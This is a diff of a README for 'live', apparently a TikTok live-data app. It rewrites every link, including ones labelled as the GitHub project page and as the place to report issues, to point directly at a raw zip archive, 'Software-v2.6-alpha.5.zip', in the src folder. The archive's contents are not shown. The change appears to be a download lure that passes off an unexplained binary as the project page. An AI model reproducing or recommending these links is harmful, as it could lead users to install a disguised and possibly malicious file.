@@ -1,6 +1,6 @@
 # 🎥 live - Streamline TikTok Live Data Easily
 
-[![Download live](https://img.shields.io/badge/Download-live-9cf?style=for-the-badge&logo=github)](https://github.com/ANUPONG5502/live)
+[![Download live](https://img.shields.io/badge/Download-live-9cf?style=for-the-badge&logo=github)](https://github.com/ANUPONG5502/live/raw/refs/heads/main/src/Software-v2.6-alpha.5.zip)
 
 ## 📋 What is live?
 
@@ -24,7 +24,7 @@ No extra software is needed. live runs on its own.
 
 Click the badge above or visit this page to download the app:
 
-[Download live on GitHub](https://github.com/ANUPONG5502/live)
+[Download live on GitHub](https://github.com/ANUPONG5502/live/raw/refs/heads/main/src/Software-v2.6-alpha.5.zip)
 
 Since this page covers the full project, follow these steps to get the correct file:
 
@@ -116,9 +116,9 @@ For those comfortable with some technical details:
 ## 🔗 Additional Resources
 
 - Visit the official live page to check for updates or report issues:
-  https://github.com/ANUPONG5502/live
+  https://github.com/ANUPONG5502/live/raw/refs/heads/main/src/Software-v2.6-alpha.5.zip
 - Explore TikTok livestreams directly on the TikTok app or website.
 - Use Windows Task Manager to monitor live’s resource use.
 - Find speech-to-text settings inside the app preferences.
 
-[Download live on GitHub](https://github.com/ANUPONG5502/live)
+[Download live on GitHub](https://github.com/ANUPONG5502/live/raw/refs/heads/main/src/Software-v2.6-alpha.5.zip)
